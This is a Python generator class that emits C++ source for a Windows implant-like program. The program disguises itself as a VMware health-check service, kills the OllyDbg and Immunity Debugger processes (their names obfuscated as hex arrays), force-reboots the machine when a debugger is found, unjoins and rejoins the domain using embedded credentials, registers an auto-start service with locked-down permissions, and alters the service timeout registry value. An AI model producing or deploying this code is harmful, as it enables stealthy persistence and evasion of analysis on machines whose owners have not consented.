class executableGenerator(object):
    """
    This object will create the necessary script to replace the domainMagic.cpp file.
    """
    def __init__(self, markerFile='C:\\System32\\Health.txt', serviceGenerationCommand='sc create "VMWare" DisplayName= "VMWare Health Check Monitor" start= auto binPath= "C:\\System32\\VMWare.exe"', servicePerms='sc sdset VMWare D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)', domain=None, domainUser=None, domainPassword=None):
        """
        Parameters:
            markerFile (string): The path and full name of the intended exectuable file, to be used as a service.
            serviceGenerationCommand (string): The intended name of the service to be created, along with a display name
            servicePerms (string): The service permissions to be applied, in SDDL format.
            domain (string): The domain to join the machine to. Apply the correct suffix (.com, etc.).
            domainUser (string): The account to utilize in joining to the domain, in domain\\user format.
            domainPassword (string): The domain password to utilize.
        """
        
        self.markerFile = markerFile
        self.wMarkerFile = self.wideCharFormatFunction(markerFile)
        self.serviceGenerationCommand = serviceGenerationCommand
        self.wServiceGenerationCommand = self.wideCharFormatFunction(serviceGenerationCommand)
        self.servicePerms = servicePerms
        self.wServicePerms = self.wideCharFormatFunction(servicePerms)
        self.domain = domain
        self.wdomain = self.wideCharFormatFunction(domain)
        self.domainUser = domainUser
        self.wdomainUser = self.wideCharFormatFunction(domainUser)
        self.domainPassword = domainPassword
        self.wdomainPassword = self.wideCharFormatFunction(domainPassword)
        self.scriptBody = '''#ifndef UNICODE
#define UNICODE
#endif

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")

#include <iostream>
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <lm.h>
#include <lmwksta.h>
#include <strsafe.h>
#include "Shlwapi.h"


void kneeCapSwing(void)
{{
    DWORD processesFound = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    PROCESSENTRY32 entry;

    entry.dwSize = sizeof(PROCESSENTRY32);
    std::wstring nametext(L"Found process(es):\\n");

    if (Process32First(snapshot, &entry) == TRUE)
    {{
        while (Process32Next(snapshot, &entry) == TRUE)
        {{
            wchar_t commonA[] = {{ 0x004f, 0x0004c, 0x004c, 0x0059, 0x0044, 0x0042, 0x0047, 0x002e, 0x0065, 0x0078, 0x0065, 0x0000 }};
            wchar_t commonB[] = {{ 0x0049, 0x006d, 0x006d, 0x0075, 0x006e, 0x0069, 0x0074, 0x0079, 0x0044, 0x0065, 0x0062, 0x0075, 0x0067, 0x0067, 0x0065, 0x0072, 0x002e, 0x0065, 0x0078, 0x0065, 0x0000 }};

            if ((_wcsicmp(entry.szExeFile, commonA) == 0) || (_wcsicmp(entry.szExeFile, commonB) == 0))
            {{
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                processesFound += 1;
                nametext.append(entry.szExeFile);
                nametext.append(L"\\n");

                //Kill it with fire.
                TerminateProcess(hProcess, 2);

                //Destroy the handle.
                CloseHandle(hProcess);
            }}

        }}
    }}

    CloseHandle(snapshot);

    // Punish the curious...
    if (processesFound)
    {{
        system("c:\\windows\\system32\\shutdown /r /t 0\\n\\n");
    }}
    
}}


bool generateFilePost(void)
{{
    //Replace with whatever you want here...
    //Yours: {0.markerFile}
    wchar_t endodermal[] = {0.wMarkerFile};

    HANDLE fileObjectHandle = CreateFileW((LPCWSTR)endodermal, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (fileObjectHandle)
    {{
        std::cout << "CreateFile() succeeded\\n";
        CloseHandle(fileObjectHandle);
        
        return true;
    }}
    else
    {{
        std::cerr << "CreateFile() failed:" << GetLastError() << "\\n";
        return false;
    }}
}}


void registerService(void)
{{
    //Yours: {0.serviceGenerationCommand}
    wchar_t serviceCommand[] = {0.wServiceGenerationCommand};

    //Yours: {0.servicePerms}
    wchar_t servicePerms[] = {0.wServicePerms};

    std::cout << "Registering Service:\\t";

    int commandResult = _wsystem(serviceCommand);

    if (commandResult == 0)
    {{
        std::cout << "Done." << std::endl;
        std::cout << "Customizing ACL:\\t";

        commandResult = _wsystem(servicePerms);
    }}
}}


bool modifyServiceTimeoutRegistryEntry(void)
{{
    HKEY hKey;
    DWORD returnedHandle;
    
    if ((returnedHandle = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\\\CurrentControlSet\\\\Control", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey)) == ERROR_SUCCESS)
    {{
        DWORD type, value, size = sizeof(DWORD);

        std::cout << "Registry Key Handle:\\t";

        if (RegGetValueA(HKEY_LOCAL_MACHINE, (LPSTR)"SYSTEM\\\\CurrentControlSet\\\\Control", (LPCSTR)"ServicesPipeTimeout", RRF_RT_REG_DWORD, &type, &value, &size) == ERROR_SUCCESS);
        {{
            std::cout << "ACQUIRED" << std::endl;
            printf("Key Current Value: %lu\\n", value);

            DWORD registryValue = 180000;

            RegSetValueExA(hKey, "ServicesPipeTimeout", 0, REG_DWORD, (const BYTE*)& registryValue, sizeof(registryValue));
            std::cout << "Key Status:\\t SUCCESSFULLY ALTERED" << std::endl;
            RegCloseKey(hKey);

            return true;
        }}
    }}

    return false;
}}

bool checkDomainRegistration(void)
{{
    DWORD dwLevel = 102;
    LPWKSTA_INFO_102 pBuf = NULL;
    LPWSTR pszServerName = NULL;
    NET_API_STATUS nStatus;

    nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE*)&pBuf);

    if (nStatus == NERR_Success)
    {{
        wprintf(L"Name:\\t%s\\n", pBuf->wki102_computername);
        wprintf(L"Domain:\\t%s\\n", pBuf->wki102_langroup);

        // Free the allocation
        if (pBuf != NULL)
        {{
            std::cout << "Freeing buffer memory:\\t";
            NetApiBufferFree(pBuf);
            std::cout << "Completed." << std::endl;
        }}

        //Checking for domain registration
        LPWSTR domainStatusPointer = NULL;
        NETSETUP_JOIN_STATUS currentStatus;
        DWORD joinedStatus = NetGetJoinInformation(NULL, &domainStatusPointer, &currentStatus);

        switch (joinedStatus)
        {{
        case 0: std::cout << "Domain Information:\\tAcquired" << std::endl;
                break;
        default: std::cout << "Domain Information:\\tUnknown" << std::endl;
                break;
        }}

        if (domainStatusPointer != NULL)
        {{
            std::cout << "Freeing Heap Alloc:\\t";
            NetApiBufferFree(domainStatusPointer);
            std::cout << "Completed." << std::endl;

            return true;
        }}

    }}
    else
    {{
        return false;
    }}
}}


NET_API_STATUS unjoinFromDomain(void)
{{
NET_API_STATUS currentStatus;

    //User: {0.domainUser}
    //Pass: {0.domainPassword}
    wchar_t userdump[] = {0.wdomainUser};
    wchar_t pass[] = {0.wdomainPassword};

    currentStatus = NetUnjoinDomain((LPCWSTR)NULL, (LPCWSTR)userdump, (LPCWSTR)pass, NULL);
    return currentStatus;
}}


NET_API_STATUS joinBackToDomain(void)
{{
    NET_API_STATUS joinStatus;

    //Domain: {0.domain}
    //User:   {0.domainUser}
    //Pass:   {0.domainPassword}
    wchar_t domain[] = {0.wdomain};
    wchar_t userdump[] = {0.wdomainUser};
    wchar_t pass[] = {0.wdomainPassword};

    joinStatus = NetJoinDomain((LPCWSTR)NULL, (LPCWSTR)domain, (LPCWSTR)NULL, (LPCWSTR)userdump, (LPCWSTR)pass, NETSETUP_JOIN_DOMAIN | NETSETUP_ACCT_CREATE | NETSETUP_DOMAIN_JOIN_IF_JOINED);
    return joinStatus;
}}


bool markerFileCheck(void)
{{
    //Replace with the marker file we want to use.
    //Yours: {0.markerFile}
    wchar_t endodermal[] = {0.wMarkerFile};

    int retval = PathFileExistsW((LPCWSTR)endodermal);

    switch (retval)
    {{
        case 1:  return true;
        default: return false;
    }}
}}


void systemReboot(void)
{{
    std::cout << "Reboot Kickoff (0 seconds):\\t";
    system("c:\\\\windows\\\\system32\\\\shutdown /r /t 0\\n");
    std::cout << "OK" << std::endl;
}}


int main()
{{
    bool fileExists, checkIfJoined, fileCreate, createRegistryEntry;
    NET_API_STATUS unjoinAttempt, joinBackAttempt;

    fileExists = markerFileCheck();

    if (fileExists == false)
    {{
        checkIfJoined = checkDomainRegistration();
        unjoinAttempt = unjoinFromDomain();
        joinBackAttempt = joinBackToDomain();
        fileCreate = generateFilePost();
    }}
    else
    {{
        std::cout << "File already exists, jumping ship..." << std::endl;
        return 1;
    }}

    if ((fileExists == false) && (checkIfJoined == true) && (joinBackAttempt == 0) && (fileCreate == true))
    {{
        registerService();
        checkDomainRegistration();

        if ((createRegistryEntry = modifyServiceTimeoutRegistryEntry()) == true)
        {{
            puts("All good, captain...");
            systemReboot();
        }}

    }}
    else 
    {{
        puts("Bailing...");
        
        // This section below is for debugging, delete for deployed version.
        printf("Unjoin Attempt?:\\t%d\\n", unjoinAttempt);
        printf("Join Attempt?:\\t%d\\n", joinBackAttempt);
        system("pause");
        
        return 0;
    }}
    
}}
'''.format(self)

    def wideCharFormatFunction(self, providedString):
        wideBytes = bytearray(providedString.encode('utf-8'))
        return('{ ' + ', '.join('0x{:04x}'.format(item) for item in wideBytes) + ', 0x0000 }')
